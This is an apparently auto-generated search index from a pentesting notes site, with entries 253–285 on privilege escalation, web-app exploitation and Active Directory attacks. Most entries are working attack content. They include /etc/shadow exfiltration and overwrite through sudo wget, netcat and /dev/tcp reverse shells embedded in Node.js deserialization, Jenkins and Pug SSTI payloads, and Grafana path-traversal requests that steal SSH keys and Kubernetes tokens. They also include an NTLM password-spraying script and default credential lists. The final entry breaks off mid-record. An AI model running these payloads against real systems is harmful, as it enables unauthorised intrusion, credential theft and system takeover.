                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-wget-privilege-escalation\/",
                title: "Sudo Wget Privilege Escalation",
                description: "The \"sudo wget\" command may be vulnerable to privilege escalation (PrivEsc).",
                content: "Investigation link sudo -l (root) NOPASSWD: /usr/bin/wget If we can execute wget as root, we may be able to escalate privileges.\nModify /etc/shadow linkGet \"/etc/shadow\" and generate a new hash passwd, then set it to the shadow file, next upload it.\nThat changes the root password.\n1. Get the Content of /etc/shadow linkTo see the content of /etc/shadow, we can use netcat listener.\nSo First, start a listener in local machine.\nnc -lvnp 4444 In target machine, display the contents of the \"/etc/shadow\" to the local machine using the following command.\nsudo /usr/bin/wget --post-file=/etc/shadow 4444 We should see the content in our local machine via netcat listener.\nCopy the content.\n2. Create a New Shadow File linkWe create a new shadow file in local. The shadow file will be stored into the target /etc/shadow later.\nvim shadow.txt In vim editor (or nano, vi, etc.), paste the content of /etc/shadow which weve copied in the previous section.\n3. Create a New Root User Password and Add to Shadow File linkGenerate a new hash password for a new root user in local machine.\n# -6: SHA512 openssl passwd -6 -salt 'salt' 'password' Copy the generated password and paste it at the password of the root user into the shadow.txt.\nAs a result, the contents of the shadow.txt should look like this:\nroot:$6$salt$IxDD...DCy.g.:18195:0:99999:7::: ... 4. Transfer the Content of the Shadow File linkTo put the shadow.txt into the target machine, start web server for hosting this file.\npython3 -m http.server 8000 Download this file into the /etc/shadow in remote machine. To do that, we need to run it as root.\nsudo /usr/bin/wget http://:8000/shadow.txt -O /etc/shadow Finally, you can switch to the root user with the password weve created.\nsu root "
            }
        );
    index.add(
            {
                id:  254 ,
                href: "\/docs\/hdks\/windows\/post-exploitation\/window-pivoting\/",
                title: "Windows Pivoting",
                description: "Accessing obtained over one machine to exploit another machine deeper in the network.",
                content: "Enumerate Network linkAfter entering the target server, enumerate and search other networks.\nCheck the ARP Cache in Target Machine link arp.exe -a Check IP Addresses link Get-Content c:\\Windows\\System32\\drivers\\etc\\hosts ipconfig /all Search Other Network Ranges linkNo content yet.\n"
            }
        );
    index.add(
            {
                id:  255 ,
                href: "\/docs\/hdks\/linux\/protocol\/x11-pentesting\/",
                title: "X11 (X Window System) Pentesting",
                description: "The X Window System is a windowing system for bitmap displays, common on Unix-like operating systems. Default ports are 6000, 6001.",
                content: "Enumeration link nmap --script x11-access -p 6000 msf\u003e use auxiliary/scanner/x11/open_x11 "
            }
        );
    index.add(
            {
                id:  256 ,
                href: "\/docs\/hdks\/web\/browser-in-the-browser-attack\/",
                title: "Browser in the Browser (BITB) Attack",
                description: "Use Templates linkThis repository is useful for attacking.",
                content: "Use Templates linkThis repository is useful for attacking.\n"
            }
        );
    index.add(
            {
                id:  257 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/mozilla-pentsting\/",
                title: "Mozilla Pentesting",
                description: "Extract Passwords from Firefox Profile link1. Transfer the .firefox Directory link Zip First, zip .firefox directory in target machine, and open web server to transfer the zip file to local machine. zip -r /tmp/firefox.zip .firefox cd /tmp python3 -m http.server 8000 In local machine, download the zip file from the remote machine, and decompress it. wget http://:8000/mozilla.zip unzip mozilla.zip Tar If we cannot use zip, tar also can be used.",
                content: "Extract Passwords from Firefox Profile link1. Transfer the .firefox Directory link Zip\nFirst, zip .firefox directory in target machine, and open web server to transfer the zip file to local machine.\nzip -r /tmp/firefox.zip .firefox cd /tmp python3 -m http.server 8000 In local machine, download the zip file from the remote machine, and decompress it.\nwget http://:8000/mozilla.zip unzip mozilla.zip Tar\nIf we cannot use zip, tar also can be used.\nIn local machine, start listener for getting the archived directory.\nout.tar will be created when the remote machine will send the compressed directory.\nnc -lvnp 1234 \u003e out.tar In remote machine, compress the directory and transfer over netcat.\ntar -cf - mozilla/ | nc 1234 Then, decompress it in local.\ntar -xf mozilla.tar 2. Decrypt the Password linkTo crack the profile of Firefox, use firefox_decrypt.\npython3 firefox_decrypt.py .mozilla/firefox/.default-release If well be asked the master password and we dont know it, try common passwords.\nadmin password password1 password123 root "
            }
        );
    index.add(
            {
                id:  258 ,
                href: "\/docs\/hdks\/web\/opencats-pentesting\/",
                title: "OpenCATS Pentesting",
                description: "OpenCATS is an Applicant Tracking System designed for Recruiters to manage recruiting process from job posting, candidate application, through to candidate selection and submission.",
                content: "Default Credentials link admin:admin admin:cats "
            }
        );
    index.add(
            {
                id:  259 ,
                href: "\/docs\/hdks\/linux\/container\/lxc-lxd-privilege-escalation\/",
                title: "LXC/LXD (Linux Container/Daemon) Privilege Escalation",
                description: "LXD is a container management extension for Linux Containers (LXC).",
                content: "Basic Flow link Check if You are in the Lxd Group\nIf you belong to the Lxd group, you may be able to the root privileges.\ngroups id Check if Container Image Exists\nList all images and check if a container image already exists.\nlxc image list If there are not container, build a new image in your local machine.\ngit clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder sudo ./build-alpine python3 -m http.server 8000 In remote machine, download the alpine-*.tar.gz and import it.\nwget http://:8000/alpine-v3.17-x86_64-20221206_0615.tar.gz lxc image import ./alpine-v3.17-x86_64-20221206_0615.tar.gz --alias testimage lxc image list After that, create a new container from the image.\nlxc init testimage testcontainer -c security.privileged=true If you got the error No storage pool found. Please create a new storage pool., initialize the lxd at first.\nlxd init # Set default values in prompt Then create a new container as above command.\nMount the New Container to Root Directory\nNow mount the hosts / directory onto /mnt/root in the container you created.\nlxc config device add testcontainer testdevice disk source=/ path=/mnt/root recursive=true Start the Container\nlxc start testcontainer Get a Shell\nlxc exec testcontainer /bin/sh Check if you are root.\nwhoami Retrieve the Sensitive Information in the Mounted Directory\ncd /mnt/root/ "
            }
        );
    index.add(
            {
                id:  260 ,
                href: "\/docs\/hdks\/web\/restaurant-management-system\/",
                title: "Restaurant Management System (RMS) Pentesting",
                description: "Remote Code Execution (RCE) v1.0 linkSee the Exploit-DB for details.\npython3 rms-rce.py https://example.com/rms/ When uploading successfully, we can access to https://example.com/rms/images/reverse-shell.php?cmd=id",
                content: "Remote Code Execution (RCE) v1.0 linkSee the Exploit-DB for details.\npython3 rms-rce.py https://example.com/rms/ When uploading successfully, we can access to https://example.com/rms/images/reverse-shell.php?cmd=id\n"
            }
        );
    index.add(
            {
                id:  261 ,
                href: "\/docs\/hdks\/web\/webanno-pentesting\/",
                title: "WebAnno Pentesting",
                description: "WebAnno is a web-based annotation tool for a wide range of linguistic annotations. The server uses the port 8080.",
                content: "Default Credentials link admin:admin Reverse Shell linkIf the target system opens the website assoated with WebAnno service, we can execute reverse shell by uploading the payload and access to the webpage hosts the payload.\n1. Go to the Upload Screen in Dashboard link Login Click Projects. Select the project in left pane. Click Documents tab. 2. Prepare Payload linkWebAnno allows us to upload arbitrary file format, so we can upload PHP file for reverse shell.\nwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php vim shell.php # Edit $ip and $port in editor. Then start listener in local machine.\nnc -lvnp 4444 3. Upload the Payload linkIn WebAnno dashboard, upload the PHP file in the Documents page.\n4. Access to the Payload File in Another Server linkFor instance, access to http://sub.example.com/path/to/shell.php, we can get a shell in the local terminal.\n"
            }
        );
    index.add(
            {
                id:  262 ,
                href: "\/docs\/hdks\/web\/grafana-pentesting\/",
                title: "Grafana Pentesting",
                description: "Grafana is a multi-platform analytics and interactive visualization web application.",
                content: "Default Credential link admin:admin admin:prom-operator Configuration File linkThe configuration file contains the admin credentials. See the admin_user and admin_password section in the file.\n/etc/grafana/grafana.ini Path Traversal link curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../etc/passwd -o passwd curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini -o grafana.ini curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../root/.ssh/id_rsa curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../root/.bash_history curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.ssh/id_rsa curl --path-as-is http://vulnerable.com:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.bash_history Getting a Shell vis JWT, Grafana Pod linkSome Grafana versions are vulnerable to Path Traversal. Kubernetes creates environment variables by default.\n1. Check Environment Variables on the Target Machine link env If you got the GRAFANA environment like the following, the Grafana service is running on the cluster.\nGRAFANA_SERVICE_HOST=10.108.133.228 GRAFANA_PORT=tcp://10.108.133.228:3000 GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000 2. Access the Grafana Dashboard linkYou can access the service at http://:.\n3. Get the JWT of the Service Account linkUsing Path Traversal (CVE-2021-43798).\ncurl --path-as-is http://:/public/plugins/alertlist/../../../../../../../../etc/passwd Get the token (JWT) of the service account.\ncurl --path-as-is http://grafana:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token 4. Decode the JWT and Get Sensitive Information linkSee "
            }
        );
    index.add(
            {
                id:  263 ,
                href: "\/docs\/hdks\/web\/webdav-pentesting\/",
                title: "WebDAV Pentesting",
                description: "WebDAV is a set of extensions to the Hypertext Transfer Protocol, which allows user agents to collaboratively author contents directly in an HTTP web server.",
                content: "Enumeration link msfconsole msf\u003e use auxiliary/scanner/http/webdav_scanner Default Credentials link wampp:xampp Reverse Shell link1. Check if the exploit can be uploaded link davtest -url http://example.com/davdir -auth 'user:pass' 2. Upload the Reverse Shell Script linkIf we can upload the file e.g. PHP file, upload the script for reverse shell.\ndavtest -url http://example.com/davdir -auth 'user:pass' -uploadfile shell.php -uploadloc shell.php 3. Get a Shell linkIn local machine, start listener for getting a shell.\nnc -lvnp 4444 Now access to http://example.com/davdir/shell.php.\nWe should get a shell.\n"
            }
        );
    index.add(
            {
                id:  264 ,
                href: "\/docs\/hdks\/web\/security-risk\/nodejs-deserialization-attack\/",
                title: "Node.js Deserialization Attack",
                description: "Node.js deserialization is vulnerable to remote command executions.",
                content: "Cookie Reverse Shell link1. Generate a Payload linkWe can use the online tools like RunKit to execute the node package.\nIf you want to do in your local environment, you need to install a npm package first.\nmkdir test cd test npm install node-serialize Next, create the payload for serialization to execute a reverse shell.\nFor instance, the file is named serialize.js.\nlet y = { rce: function() { require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc \u003e/tmp/f', function(error, stdout, stderr) { console.log(stdout); }); }, }; let serialize = require('node-serialize'); console.log(\"Serialized: \\n\" + serialize.serialize(y)); In the above code, change \"\" and \"\" to match your environment.\nExecute node to generate the payload.\nnode serialize.js Our payload generated in terminal.\nNext, we need to add IIFE brackets \"()\" after the function in the generated payload. By doing this, the function will invoke when the object created. For details, please see the awesome post.\nThe final payload is as below:\n{\"rce\":\"_$$ND_FUNC$$_function() {require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc \u003e/tmp/f', (error, stdout, stderr) =\u003e { console.log(stdout); }); } ()\"} In addition, edit the key name (rce) and remove \\n characters as you want.\n2. Encode a Payload by Base64 and Add to Cookie linkCopy the above json object and encode it by Base64, then copy the encoded text.\nPaste it to the Cookie value of HTTP header in target website.\nCookie: session=eyJyY2U...iAgfSJ9== 3. Execute Reverse Shell linkStart a listener for reverse shell\nnc -lvnp In target website, reload the page.\nYou should get a shell.\n"
            }
        );
    index.add(
            {
                id:  265 ,
                href: "\/docs\/hdks\/web\/jenkins-pentesting\/",
                title: "Jenkins Pentesting",
                description: "Jenkins is an automation server which helps automate the parts of software development related to building, testing, and deploying, etc.",
                content: "Brute Force Credentials link msfconsole msf \u003e use auxiliary/scanner/http/jenkins_login Reverse Shell on Dashboard linkYou need to have the credential.\nOpening Listener on Your Local Machine\nnc -lvnp 4444 Login to Jenkins\nAccess http://localhost:8080 in browser and login.\nClick Manage Jenkins -\u003e Script Console\nAdd the Payload in the Console\nr = Runtime.getRuntime() p = r.exec([\"/bin/bash\", \"-c\", \"exec 5\u003c\u003e/dev/tcp//4444; cat \u003c\u00265 | while read line; do \\$line 2\u003e\u00265 \u003e\u00265; done\"] as String[]) p.waitFor() Click Run\nThen you should get a shell.\n"
            }
        );
    index.add(
            {
                id:  266 ,
                href: "\/docs\/hdks\/web\/security-risk\/crlf-injection\/",
                title: "CRLF (Carriage Return Line Feed) Injection",
                description: "CRLF Injection occurs when a user manages to submit a CRLF into  an application. This is most commonly done by modifying an HTTP parameter or URL.",
                content: "No content yet.\n"
            }
        );
    index.add(
            {
                id:  267 ,
                href: "\/docs\/hdks\/windows\/protocol\/rdp-pentesting\/",
                title: "RDP (Remote Desktop Protocol) Pentesting",
                description: "RDP is a protocol that provides a user with a graphical interface to connect to another computer over a network connection. A default port is 3389.",
                content: "Enumeration link nmap --script rdp-enum-encryption -p 3389 nmap --script rdp-ntlm-info -p 3389 nmap --script rdp* -p 3389 Brute Force Credentials link hydra -l username -P passwords.txt rdp hydra -L usernames.txt -p password rdp Connect linkRemmina linkRemmina is a remote desktop client for POSIX-based computer operating systems.\nremmina # -c: Connect given URI or file remmina -c rdp://username@vulnerable.com remmina -c rdp://domain\\\\username@vulnerable.com remmina -c rdp://username:password@vulnerable.com # --------------------------------------------------------------------------------- # Settings # Keyboard mapping 1. On Remmina client window, click menu icon and move to \"Preferences\". 2. Navigate to \"RDP\" tab and check \"Use client keyboard mapping\". 3. Reboot Remmina FreeRDP link xfreerdp /u:username /v:10.0.0.1:3389 xfreerdp /u:username /p:password /cert:ignore /v:10.0.0.1 /workarea # Create a shared drive (/drive:LOCAL_DIR,SHARE_NAME) xfreerdp /u:username /p:password /drive:.,share /v:10.0.0.1 # Useful command for exploiting xfreerdp /v:10.0.0.1 /u:username /p:password +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share # -------------------------------------------------------------------------------- # On remote Windows # Access share directory in Command Prompt or PowerShell \\\\tsclient\\\\~share\\ Rdesktop link rdesktop -u username -p password 10.0.0.1:3389 "
            }
        );
    index.add(
            {
                id:  268 ,
                href: "\/docs\/hdks\/web\/web-browser-settings-for-pentesting\/",
                title: "Web Browser Settings for Pentesting",
                description: "Bypass Port Protection linkMany browsers dont accept uncommon ports for HTTP (HTTPS). For example, when we attempt to access http://example.com:22, browsers present that it cannot be accessed.\nTo release such a restricted thing, we can edit the setting in browsers.\nFirefox link Enter about:config in search bar. Input network.security.ports.banned.override in the form. Add the desired port (e.g. 22) to string. ",
                content: "Bypass Port Protection linkMany browsers dont accept uncommon ports for HTTP (HTTPS). For example, when we attempt to access http://example.com:22, browsers present that it cannot be accessed.\nTo release such a restricted thing, we can edit the setting in browsers.\nFirefox link Enter about:config in search bar. Input network.security.ports.banned.override in the form. Add the desired port (e.g. 22) to string. "
            }
        );
    index.add(
            {
                id:  269 ,
                href: "\/docs\/hdks\/reconnaissance\/imint-and-geoint\/",
                title: "IMINT (Image Intelligence) and GEOINT (Geospatial Intelligence)",
                description: "IMINT and GEOINT are types of OSINT to reveal desired information from analyzing images.",
                content: "Basic Investigation link open example.jpg Google Dorks linkSearch the keyword which is found in the image.\nName Location (country, city, etc.) When does it open Reverse Image Search linkUpload the image in each search engine.\nBing Images\nGoogle Images\nClick the Search by image icon and upload the image.\nYandex Images\nVideo (mp4) Geolocation linkFFmpeg extracts every single frame from a video.\n# -i: input file # %06d: followed by six digits e.g. img_000001.png, img_000002.png, etc. # -hide_banner: hide unnecessary text. # -r: frame rate (e.g. 1 frame per second) ffmpeg -i example.mp4 -r 1 img_%06d.png -hide_banner "
            }
        );
    index.add(
            {
                id:  270 ,
                href: "\/docs\/hdks\/web\/elasticsearch\/kibana-pentesting\/",
                title: "Kibana Pentesting",
                description: "A proprietary data visualization dashboard software for Elasticsearch. A default port is 5601.",
                content: "Vulnerabilities linkLocal File Inclusion (LFI) Version \u003c 6.4.3 \u0026 5.6.13 link curl http://:5601/api/console/api_server?sense_version=@@SENSE_VERSION\u0026apis=../../../../../../.../../../../root.txt Remote Code Execution (RCE) Version \u003c 6.6.0 linkReference: https://github.com/mpgn/CVE-2019-7609\n"
            }
        );
    index.add(
            {
                id:  271 ,
                href: "\/docs\/hdks\/windows\/active-directory\/laps-pentesting\/",
                title: "LAPS (Local Administrator Password Solution) Pentesting",
                description: "LAPS provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory.",
                content: "Enumeration link msfconsole use post/windows/gather/credentials/enum_laps set session 2 exploit Obtain Administrators Password linkFirst, check if you are in the LAPS_Readers group.\nnet user # Global Group memberships *LAPS_Readers Using Get-ADComputer linkGet-ADComputer gets the information of the Active Directory computer.\nGet-ADComputer -Identity '' -property 'ms-mcs-admpwd' Using Get-LAPSPasswords.ps1 link Download the Payload in Local Machine\nIf you are in LAPS_Readers, you can get the administrators password using Get-LAPSPasswords.ps1{:target=\"_blank\"}{:rel=noopener}.\nwget https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1 Transfer the Payload to Target Machine\nvia PowerShell\nFirst off, open web server in local machine.\npython3 -m http.server 8000 Then curl in target machine\ncurl http://:8000/Get-LAPSPasswords.ps1 -o .\\Get-LAPSPasswords.ps1 via Evil-WinRM\nIf you connect the remote Windows machine with Evil-WinRM, you can use directly by adding -s flag when connecting.\nevil-winrm -i -u username -p password -s /path/to/current/directory Then just execute the payload in evil-winrm console.\nPS \u003e upload .\\Get-LAPSPasswords.ps1 c:\\Users\\\\Desktop\\Get-LAPSPasswords.ps1 Execute the Payload in Target Machine\n.\\Get-LAPSPasswords.ps1 "
            }
        );
    index.add(
            {
                id:  272 ,
                href: "\/docs\/hdks\/reconnaissance\/social-engineering\/",
                title: "Social Engineering",
                description: "Investigate Emails/Phone Numbers link Have I Been Pwned\nIt checks if the email address or the phone number has been exposed.",
                content: "Investigate Emails/Phone Numbers link Have I Been Pwned\nIt checks if the email address or the phone number has been exposed.\n"
            }
        );
    index.add(
            {
                id:  273 ,
                href: "\/docs\/hdks\/web\/tiny-file-manager-pentesting\/",
                title: "Tiny File Manager Pentesting",
                description: "Tiny File Manager is a simple and small file manager with single php file.",
                content: "Default Credentials link admin:admin@123 user:12345 Reverse Shell linkIf we can login and access the dashboard of the Tiny File Manager, upload the reverse shell script and get a shell.\nFirst, download the reverse shell script.\nwget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php -O shell.php Update values of $ip and $port in the above script to our local ip and port for listener which will start. Then upload the script to the arbitrary folder in the Tiny File Manager dashboard.\nNow start netcat listener.\nnc -lvnp 4444 Access the page with the uploaded script. e.g. http://vulnerable.com/uploads/shell.php\".\nWe should get a target shell.\nRemote Code Execution (RCE) Version2.4.6 linkThe payload can be downloaded from Exploit-DB\nwget https://www.exploit-db.com/raw/50828 -O exploit.sh dos2unix exploit.sh chmod +x exploit.sh ./exploit.sh http://vulnerable.com/index.php admin \"admin@123\" If you got the jq not found error, install it and run again.\nsudo apt install jq "
            }
        );
    index.add(
            {
                id:  274 ,
                href: "\/docs\/hdks\/web\/security-risk\/xst\/",
                title: "XST (Cross-Site Tracing)",
                description: "XST is a network security vulnerability exploiting the HTTP TRACE method.",
                content: "Add Cookie Header link TRACE / HTTP/1.1 ... Cookie: name=value ... "
            }
        );
    index.add(
            {
                id:  275 ,
                href: "\/docs\/hdks\/web\/web-php-pentesting\/",
                title: "Web PHP Pentesting",
                description: "Deobfuscate PHP Files with Syntax Highlighting linkAccording to the PHP Manual, you might be able to deobfuscate php files by accessing with phps extension if the highlight_file is used in the target website.\nhttps://vulnerable.com/index.phps ",
                content: "Deobfuscate PHP Files with Syntax Highlighting linkAccording to the PHP Manual, you might be able to deobfuscate php files by accessing with phps extension if the highlight_file is used in the target website.\nhttps://vulnerable.com/index.phps "
            }
        );
    index.add(
            {
                id:  276 ,
                href: "\/docs\/hdks\/web\/hashicorp-consul-pentesting\/",
                title: "HashiCorp Consul Pentesting",
                description: "An open-source service networking platform developed by HashiCorp. A default port is 8500.",
                content: "Privilege Escalation linkIf you have the ACL token (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx), you may be able to privilege escalation.\nFirst, create a script which changes the permission of bash.\necho 'chmod +s /usr/bin/bash' \u003e /tmp/exploit.sh Then curl.\ncurl --header \"X-Consul-Token: \" --request PUT -d '{\"ID\": \"test\", \"Name\": \"test\", \"Address\": \"127.0.0.1\", \"Port\": 80, \"check\": {\"Args\": [\"/usr/bin/bash\", \"/tmp/e.sh\"], \"interval\": \"10s\", \"timeout\": \"1s\"}}' http://127.0.0.1:8500/v1/agent/service/register KV (Key/Value) Store link # Put consul kv put --token key value consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 path/to/store data "
            }
        );
    index.add(
            {
                id:  277 ,
                href: "\/docs\/hdks\/web\/tool\/how-to-use-owasp-zap\/",
                title: "How to Use OWASP ZAP",
                description: "OWASP ZAP is an open-source web application security scanner.",
                content: "Automated Scan link Ajax Spider\nIf you want to use the ajax spider with HtmlUnit (the easiest way), you may need to install the HtmlUnit.\nsudo apt install libjenkins-htmlunit-core-js-java Intercept Request link Right-click on the URL. Select Break The Add Breakpoint window will appear. Manual Request linkOWASP ZAP can resend a request in which you can manually edit the header like the Burp Suites Repeater.\nRight-click on the URL. Select Open/Resend with Request Editor. Brute Force Directories link Right-click on the URL. Select Attack  Forced Browse Site. At the bottom of the panel, the Forced Browse tab will appear, then open the tab. Set the wordlist in the List. Click Start Forced Browse. Brute Force Credentials link Right-click on the URL. Select Attack  Fuzz. The Fuzzer window will open. Hihglight the target value (e.g. username, password, etc.). Add a wordlist from local files. Click Start Fuzzer. ZAP Extensions link ZAP add-ons HUNT Suite "
            }
        );
    index.add(
            {
                id:  278 ,
                href: "\/docs\/hdks\/windows\/active-directory\/ntlm-pentesting\/",
                title: "NTLM (New Technology LAN Manager) Pentesting",
                description: "NTLM is a suite of security protocols.",
                content: "Password Spraying Attack (Brute Force Credentials) linkFirst off, prepare the wordlist of usernames.\nanthony.reynolds samantha.thompson dawn.turner frances.chapman ... Next create the exploit for brute force attack.\n#!/usr/bin/python3 import requests from requests_ntlm import HttpNtlmAuth import sys, getopt class NTLMSprayer: def __init__(self, fqdn): self.HTTP_AUTH_FAILED_CODE = 401 self.HTTP_AUTH_SUCCEED_CODE = 200 self.verbose = True self.fqdn = fqdn def load_users(self, userfile): self.users = [] lines = open(userfile, 'r').readlines() for line in lines: self.users.append(line.replace(\"\\r\", \"\").replace(\"\\n\", \"\")) def password_spray(self, password, url): print (\"[*] Starting passwords spray attack using the following password: \" + password) count = 0 for user in self.users: response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + \"\\\\\" + user, password)) if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE): print (\"[+] Valid credential pair found! Username: \" + user + \" Password: \" + password) count += 1 continue if (self.verbose): if (response.status_code == self.HTTP_AUTH_FAILED_CODE): print (\"[-] Failed login with Username: \" + user) print (\"[*] Password spray attack completed, \" + str(count) + \" valid credential pairs found\") def main(argv): userfile = '' fqdn = '' password = '' attackurl = '' try: opts, args = getopt.getopt(argv, \"hu:f:p:a:\", [\"userfile=\", \"fqdn=\", \"password=\", \"attackurl=\"]) except getopt.GetoptError: print (\"ntlm_passwordspray.py -u -f -p -a \") sys.exit(2) for opt, arg in opts: if opt == '-h': print (\"ntlm_passwordspray.py -u -f -p -a \") sys.exit() elif opt in (\"-u\", \"--userfile\"): userfile = str(arg) elif opt in (\"-f\", \"--fqdn\"): fqdn = str(arg) elif opt in (\"-p\", \"--password\"): password = str(arg) elif opt in (\"-a\", \"--attackurl\"): attackurl = str(arg) if (len(userfile) \u003e 0 and len(fqdn) \u003e 0 and len(password) \u003e 0 and len(attackurl) \u003e 0): #Start attack sprayer = NTLMSprayer(fqdn) sprayer.load_users(userfile) sprayer.password_spray(password, attackurl) sys.exit() else: print (\"ntlm_passwordspray.py -u -f -p -a \") sys.exit(2) if __name__ == \"__main__\": main(sys.argv[1:]) Now execute the exploit.\npython3 exploit.py -u -f -p http:/// python3 exploit.py -u usernames.txt -f sub.vulnerable.com -p password http://ntlmauth.sub.vulnerable.com/ "
            }
        );
    index.add(
            {
                id:  279 ,
                href: "\/docs\/hdks\/web\/security-risk\/oauth-attack\/",
                title: "OAuth Attack",
                description: "Change User Info link POST /authenticate HTTP/1.1 ... { \"email\":\"victim@example.com\", \"username\":\"attacker\", \"token\":\"b7Gl7Xoy...\" } Steal Tokens link Open Web Server in Your Local Machine python3 -m http.server 8000 Inject Your Local URL to the Redirect URL Access to the URL below. https://vulnerable.com/oauth?redirect_url=http://:8000/login\u0026response_type=token\u0026scope=all CSRF link Steal Code Hijack redirect_url Open Redirect Proxy Page (postMessage)",
                content: "Change User Info link POST /authenticate HTTP/1.1 ... { \"email\":\"victim@example.com\", \"username\":\"attacker\", \"token\":\"b7Gl7Xoy...\" } Steal Tokens link Open Web Server in Your Local Machine\npython3 -m http.server 8000 Inject Your Local URL to the Redirect URL\nAccess to the URL below.\nhttps://vulnerable.com/oauth?redirect_url=http://:8000/login\u0026response_type=token\u0026scope=all CSRF link Steal Code\nHijack redirect_url\nOpen Redirect\nProxy Page (postMessage)\n"
            }
        );
    index.add(
            {
                id:  280 ,
                href: "\/docs\/hdks\/web\/oob-attack\/",
                title: "OOB (Out of Band) Attack",
                description: "Tools linkinteractsh linkOOB (Out Of Band) interaction gathering server and client library.\ninteractsh-client ",
                content: "Tools linkinteractsh linkOOB (Out Of Band) interaction gathering server and client library.\ninteractsh-client "
            }
        );
    index.add(
            {
                id:  281 ,
                href: "\/docs\/hdks\/windows\/powershell\/powerview\/",
                title: "PowerView",
                description: "A Powershells script to gain network situational awareness on Windows domain.",
                content: "Enabling PowerView on PowerShell link Import-Module .\\PowerView.ps1 To start PowerView\n. .\\PowerView.ps1 Enumeration link # List domain users Get-NetUser | select cn # List domain groups Get-NetGroup -GroupName *admin* # Get shared folders Invoke-ShareFinder # Get operating systems running Get-NetComputer -fulldata | select operatingsystem # Find files or directories Get-ChildItem -r -Filter \"*.txt\" -Name "
            }
        );
    index.add(
            {
                id:  282 ,
                href: "\/docs\/hdks\/web\/template-engine\/pug-pentesting\/",
                title: "Pug Pentesting",
                description: "Pug is a template engine for Node.js.",
                content: "Server-Side Template Injection (SSTI) link #{2*2} #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('id')}()} Reverse Shell linkFirst off, create a payload.\nuse Socket;$i=\"\";$p=;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");}; Encode it with Base64.\nAnd start listener for getting the incoming connection.\nnc -lvnp 4444 Then prepare the full payload contained the above Base64 encoded hash.\nh1= Hello world p 3*3 is #{3*3} #{spawn_sync = this.process.binding('spawn_sync')} #{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined\u0026\u0026(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}} #{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c"
            }
        );
    index.add(
            {
                id:  283 ,
                href: "\/docs\/hdks\/web\/cms\/typo3-pentesting\/",
                title: "TYPO3 Pentesting",
                description: "TYPO3 is a web content management system. It can run on web servers like Apache, Nginx or IIS.",
                content: "Directory Discovery link /fileadmin/ /typo3/ /typo3conf/ /typo3temp/ Default Credentials link admin: Reverse Shell (Admin Credential Required) linkFirst, to check and edit the configuration of the uploaded file extension, go to ADMIN TOOLS  Configure Installation-Wide Options  Backend  fileDenyPattern.\nUpdate the configuration if necessary. For example, remove php[1-9]?\n\\.(phpsh|phtml|pht|phar|shtml|cgi)(\\..*)?$|\\.pl$|^\\.htaccess$ Next, prepare the payload for reverse shell named shell.php.\nwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php Go to FILE  Filelist and upload the payload to the root of /fileadmin.\nNow you need to open listener for getting the shell.\nnc -lvnp 4444 Then access to /fileadmin/shell.php. You should get the shell.\n"
            }
        );
    index.add(
            {
                id:  284 ,
                href: "\/docs\/hdks\/web\/webmin-pentesting\/",
                title: "Webmin Pentesting",
                description: "Webmin is a web-based system administration tool for Unix. The default port is 10000.",
                content: "Default Credentials link admin:admin password_chagne.cgi Command Injection version=1.890 link msfconsole msf\u003e use exploit/linux/http/webmin_backdoor msf\u003e set rhosts msf\u003e set lhost msf\u003e run shell Remote Code Execution (RCE) version\u003c2.37 linkWebmin version\u003c2.37 is vulnerable to remote code execution.\nDownload the payload .\ngit clone https://github.com/MuirlandOracle/CVE-2019-15107 cd CVE-2019-15107 python3 CVE-2019-15107.py "
            }
        );
    index.add(
            {
                id:  285 ,
                href: "\/docs\/hdks\/web\/framework\/java\/ajp-pentesting\/",
                title: "AJP (Apache JServ Protocol) Pentesting",
                description: "AJP is a binary protocol that can proxy inbound requests from a web server through to an application server that sits behind the web server. A default port is 8009.",
